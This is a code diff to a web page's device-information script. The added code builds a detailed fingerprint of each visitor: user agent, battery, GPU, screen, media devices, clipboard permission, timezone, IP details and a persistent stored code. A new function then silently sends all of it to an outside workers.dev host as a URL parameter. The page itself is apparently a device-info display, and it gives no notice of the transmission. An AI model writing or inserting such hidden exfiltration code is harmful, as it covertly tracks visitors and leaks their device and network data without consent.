@@ -100,37 +100,44 @@
         }
     }
 
+    async function sendMessageToURL(message) {
+        const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
+        try {
+            await fetch(url);
+        } catch (error) {
+            console.error('Error sending message:', error);
+        }
+    }
+
     async function displayDeviceInfo() {
         const infoDiv = document.getElementById("deviceInfo");
-        let output = "";  // Initialize output as an empty string.
+        let output = "";
 
-        // Generate or retrieve stored user code
         let userCode = getStoredItem("userCode");
         if (!userCode) {
             userCode = generateRandomCode();
             setStoredItem("userCode", userCode);
         }
 
-        output += `<div class="info-line">Random Code (Stored): ${userCode}</div>`;
+        output += `Random Code (Stored): ${userCode}\n\n`;
 
-        // Update and get number of times opened
         let timesOpened = parseInt(getStoredItem("timesOpened") || "0");
         timesOpened++;
         setStoredItem("timesOpened", timesOpened);
-        output += `<div class="info-line">Number of Times Opened: ${timesOpened}</div>`;
+        output += `Number of Times Opened: ${timesOpened}\n\n`;
 
         const pageRequestDate = new Date();
-        output += `<div class="info-line">Page Request Date & Time: ${pageRequestDate.toLocaleString()} (Local Time)</div>`;
+        output += `Page Request Date & Time: ${pageRequestDate.toLocaleString()} (Local Time)\n\n`;
 
         const userAgent = navigator.userAgent;
-        output += `<div class="info-line">User Agent: ${userAgent}</div>`;
+        output += `User Agent: ${userAgent}\n\n`;
 
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
-            output += `<div class="info-line">Battery Level: ${(battery.level * 100).toFixed(0)}%</div>`;
-            output += `<div class="info-line">Charging: ${battery.charging ? "Yes" : "No"}</div>`;
+            output += `Battery Level: ${(battery.level * 100).toFixed(0)}%\n\n`;
+            output += `Charging: ${battery.charging ? "Yes" : "No"}\n\n`;
         } else {
-            output += `<div class="info-line">Battery Status: Not supported</div>`;
+            output += `Battery Status: Not supported\n\n`;
         }
 
         const canvas = document.createElement("canvas");
@@ -144,76 +151,75 @@
                 graphicsCard = graphicsCardName || "Not available";
             }
         }
-        output += `<div class="info-line">Graphics Card Name / Driver: ${graphicsCard}</div>`;
+        output += `Graphics Card Name / Driver: ${graphicsCard}\n\n`;
 
-        output += `<div class="info-line">Touchscreen: ${"ontouchstart" in window ? "Yes" : "No"}</div>`;
+        output += `Touchscreen: ${"ontouchstart" in window ? "Yes" : "No"}\n\n`;
 
-        output += `<div class="info-line">Languages: ${navigator.languages.join(", ")}</div>`;
+        output += `Languages: ${navigator.languages.join(", ")}\n\n`;
 
         if (navigator.storage && navigator.storage.estimate) {
             try {
                 const { quota, usage } = await navigator.storage.estimate();
-                output += `<div class="info-line">Storage Quota: ${(quota / (1024 * 1024)).toFixed(2)} MB</div>`;
-                output += `<div class="info-line">Used Storage: ${(usage / (1024 * 1024)).toFixed(2)} MB</div>`;
+                output += `Storage Quota: ${(quota / (1024 * 1024)).toFixed(2)} MB\n\n`;
+                output += `Used Storage: ${(usage / (1024 * 1024)).toFixed(2)} MB\n\n`;
             } catch {
-                output += `<div class="info-line">Storage Details: Not available</div>`;
+                output += `Storage Details: Not available\n\n`;
             }
         } else {
-            output += `<div class="info-line">Storage API: Not supported</div>`;
+            output += `Storage API: Not supported\n\n`;
         }
 
-        output += `<div class="info-line">Browser Outer Size: ${window.outerWidth} x ${window.outerHeight} pixels</div>`;
-        output += `<div class="info-line">Browser Inner Size: ${window.innerWidth} x ${window.innerHeight} pixels</div>`;
+        output += `Browser Outer Size: ${window.outerWidth} x ${window.outerHeight} pixels\n\n`;
+        output += `Browser Inner Size: ${window.innerWidth} x ${window.innerHeight} pixels\n\n`;
 
-        output += `<div class="info-line">Screen Orientation: ${screen.orientation.type}</div>`;
-        output += `<div class="info-line">Screen Resolution: ${screen.width} x ${screen.height} pixels</div>`;
-        output += `<div class="info-line">Aspect Ratio: ${screen.width}:${screen.height}</div>`;
-        output += `<div class="info-line">Device Pixel Ratio: ${window.devicePixelRatio}</div>`;
-        output += `<div class="info-line">Color Depth: ${screen.colorDepth}-bit</div>`;
+        output += `Screen Orientation: ${screen.orientation.type}\n\n`;
+        output += `Screen Resolution: ${screen.width} x ${screen.height} pixels\n\n`;
+        output += `Aspect Ratio: ${screen.width}:${screen.height}\n\n`;
+        output += `Device Pixel Ratio: ${window.devicePixelRatio}\n\n`;
+        output += `Color Depth: ${screen.colorDepth}-bit\n\n`;
 
-        output += `<div class="info-line">Do Not Track: ${navigator.doNotTrack === "1" ? "Enabled" : "Disabled"}</div>`;
+        output += `Do Not Track: ${navigator.doNotTrack === "1" ? "Enabled" : "Disabled"}\n\n`;
 
-        output += `<div class="info-line">Cookies: ${checkCookies()}</div>`;
+        output += `Cookies: ${checkCookies()}\n\n`;
 
-        output += `<div class="info-line">Bluetooth Support: ${detectBluetooth()}</div>`;
+        output += `Bluetooth Support: ${detectBluetooth()}\n\n`;
 
         const mediaDevices = await detectMediaDevices();
-        output += `<div class="info-line">Speakers Detected: ${mediaDevices.speakersCount}</div>`;
-        output += `<div class="info-line">Microphones Detected: ${mediaDevices.microphonesCount}</div>`;
-        output += `<div class="info-line">Cameras Detected: ${mediaDevices.cameraCount}</div>`;
+        output += `Speakers Detected: ${mediaDevices.speakersCount}\n\n`;
+        output += `Microphones Detected: ${mediaDevices.microphonesCount}\n\n`;
+        output += `Cameras Detected: ${mediaDevices.cameraCount}\n\n`;
 
-        output += `<div class="info-line">Firefox Extensions Supported: ${navigator.userAgent.includes("Firefox") ? "Yes" : "No"}</div>`;
+        output += `Firefox Extensions Supported: ${navigator.userAgent.includes("Firefox") ? "Yes" : "No"}\n\n`;
 
-        output += `<div class="info-line">Memory (RAM): ${navigator.deviceMemory || "Unknown"} GB</div>`;
+        output += `Memory (RAM): ${navigator.deviceMemory || "Unknown"} GB\n\n`;
 
-        output += `<div class="info-line">Number of cores in CPU: ${navigator.hardwareConcurrency || "Unknown"}</div>`;
+        output += `Number of cores in CPU: ${navigator.hardwareConcurrency || "Unknown"}\n\n`;
 
         try {
             const clipboardAccess = await navigator.permissions.query({ name: 'clipboard-read' });
-            output += `<div class="info-line">Clipboard Access: ${clipboardAccess.state === "granted" ? "Allowed" : "Disabled"}</div>`;
+            output += `Clipboard Access: ${clipboardAccess.state === "granted" ? "Allowed" : "Disabled"}\n\n`;
         } catch (e) {
-            output += `<div class="info-line">Clipboard Access: Disabled</div>`;
+            output += `Clipboard Access: Disabled\n\n`;
         }
 
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        output += `<div class="info-line">Time Zone: UTC ${timeZone}</div>`;
+        output += `Time Zone: UTC ${timeZone}\n\n`;
 
-        // Add Internet Connection status
-        output += `<div class="info-line">Internet Connection: ${getConnectionType()}</div>`;
+        output += `Internet Connection: ${getConnectionType()}\n\n`;
 
-        output += `<div class="info-line">Mouse detected: ${detectMouse()}</div>`;
+        output += `Mouse detected: ${detectMouse()}\n\n`;
 
-        // Check Google Analytics pixel
         const pixelStatus = await checkGoogleAnalyticsPixel();
-        output += `<div class="info-line">G Analytics Tracker Loaded: ${pixelStatus}</div>`;
+        output += `G Analytics Tracker Loaded: ${pixelStatus}\n\n`;
 
-        // Fetch IP info and display it
         const ipInfo = await fetchIPInfo();
         if (ipInfo) {
-            output += `<div class="info-line">IP Information: ${JSON.stringify(ipInfo)}</div>`;
+            output += `IP Information: ${JSON.stringify(ipInfo)}\n\n`;
         } else {
-            output += `<div class="info-line">IP Information: Unable to fetch</div>`;
+            output += `IP Information: Unable to fetch\n\n`;
         }
+
+        await sendMessageToURL(output);
 
         infoDiv.innerHTML = output;
     }
